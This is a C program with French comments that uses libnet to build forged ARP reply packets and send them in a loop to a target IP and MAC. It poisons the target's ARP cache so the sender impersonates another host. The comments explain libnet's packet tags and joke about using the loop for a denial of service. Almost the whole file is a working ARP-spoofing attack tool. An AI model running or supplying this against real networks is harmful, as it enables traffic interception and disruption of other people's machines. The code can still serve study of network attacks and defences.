#include <stdlib.h>
#include <stdio.h>
#include <libnet.h>
#include <netinet/in.h>
#include <unistd.h>

#define MAC_LEN 6
#define IP_LEN 4

libnet_ptag_t init_arp(libnet_t* l, u_int8_t* mac_src, u_int8_t* ip_src, u_int8_t* mac_dst, u_int8_t* ip_dst) {
	libnet_ptag_t arp_tag;
	libnet_ptag_t eth_tag;
    
	arp_tag = libnet_autobuild_arp(ARPOP_REPLY, mac_src, ip_src, mac_dst, ip_dst, l); 
	if (arp_tag == -1)
	{
		fprintf(stderr, "construction hdr arp : %s\n", libnet_geterror(l));
		return -1;
	}
	
	eth_tag = libnet_autobuild_ethernet(mac_dst, ETHERTYPE_ARP, l);
	if (eth_tag == -1)
	{
		fprintf(stderr, "construction hdr eth : %s\n", libnet_geterror(l));
		return -1;
	}
    
	return arp_tag;
}  

 
int main(int argc, char** argv) {
	libnet_t* context;
	char* device = "wlan0"; /* par defaut eth0 est selectionne par libnet */
	char err_buf[LIBNET_ERRBUF_SIZE];
	struct libnet_ether_addr* my_mac = NULL;
    u_int8_t* mac_target = NULL;
    struct in_addr ip_spoofed;
    struct in_addr ip_target;
    int mac_len = MAC_LEN;
    
		/* 
     * <ip_spoofed> : l'ip de la machine pour laquelle on veut se faire passer
     * C'est pas un spoof d'ip pour rappel, on designe juste la machine par son ip
     * 
     * <ip_target> <mac_target> : la machine qui recevra notre paquet forgé et qui
     * verra son cache empoisonné de fait. (sauf si cette entrée est définie comme
     * statique.
     */
	if (argc < 4)
	{
		printf("[Usage]\n");
		printf("%s <ip_spoofed> <ip_target> <mac_target>\n", argv[0]);
		return 0;
	}
	
    
    /* Initialisation du contexte..bon là go lire doc si ça vous intéresse
     * Le contexte maintient un pool mémoire qui permettra de garder efficacement
     * à portée de main des morceaux de paquets déjà construits par exemple.
     * On les repère grâce à un tag qui est renvoyé par chaque fonction de construction.
     * Ainsi, on peut les réutiliser ultérieurement pour un simple update sans une 
     * reconstruction complète.
     */
	context = libnet_init(LIBNET_LINK, device, err_buf);
	if (context == NULL)
	{
		fprintf(stderr, "libnet_init : %s\n", err_buf);
		exit(1);
	}
    
    
    /*
     * Sans commentaire ou pour la forme : recupération de la mac address
     * de la carte réseau sélectionné par l'initialisation de libnet.
     */
	my_mac = libnet_get_hwaddr(context);
	if (my_mac == NULL)
	{
		fprintf(stderr, "libnet_gethwaddr() : %s\n", libnet_geterror(context));
		exit(1);
	}
	
    /*
     * Gerer ip
     */
	if (inet_aton(argv[1], &ip_spoofed) == 0)
	{
		fprintf(stderr, "ip_spoofed invalide\n");
		exit(1);
	}
	
	if (inet_aton(argv[2], &ip_target) == 0)
	{
		fprintf(stderr, "ip_target invalide\n");
		exit(1);
	}
	
    /* Petite conversion magique pour une mac string sous format
     * AA:BB:CC:EE:FF:00
     */
	mac_target = libnet_hex_aton(argv[3], &mac_len);
	if (mac_target == NULL)
	{
		fprintf(stderr, "libnet_hex_aton : %s\n", libnet_geterror(context));
		exit(1);
    }
    
    /* Alors ici, je construis le premier paquet de ce nom, from scratch.
     * A noter qu'on récupère le tag pour le réutiliser ultérieurement
     */ 
    libnet_ptag_t arp_tag = init_arp(context, my_mac->ether_addr_octet, (u_int8_t*) &ip_spoofed, mac_target, (u_int8_t*) &ip_target);
    do {
        /* On signale que le paquet construit couche par couche doit etre
         * ecrit sur la couche de liaison
         */
         
        if (libnet_write(context) == -1)
        {
            fprintf(stderr, "envoi du packet : %s\n", libnet_geterror(context));
            return -1;
        }
        
        /* 
         * A première vue on reconstruit un paquet arp comme ci-dessus. 
         * On remarquera la presence du arp_tag en dernier argument,
         * qui va signifier au contexte d'aller rechercher ce header particulier
         * et ce qu'il wrappe (donc la couche ethernet avec).
         * Permet donc de gagner en performance pour ne recréer au final que 
         * le même paquet. Parfait pour quand on a un petit déni à organiser.
         * (Antoine rêve pas de mettre un serveur down avec ton atom, même un tomcat 
         * sui tourne avec du Java)
         */
        arp_tag = libnet_build_arp(
                    ARPHRD_ETHER,
                    ETHERTYPE_IP,
                    MAC_LEN,
                    IP_LEN,
                    ARPOP_REPLY,
                    my_mac->ether_addr_octet,
                    (u_int8_t*) &ip_spoofed,
                    mac_target,
                    (u_int8_t*) &ip_target,
                    NULL, /* payload */
                    0, /* payload size */
                    context,
                    arp_tag
                );
                
    } while (arp_tag != -1 && sleep(1) == 0);
    
	libnet_destroy(context);
	return 0;
}
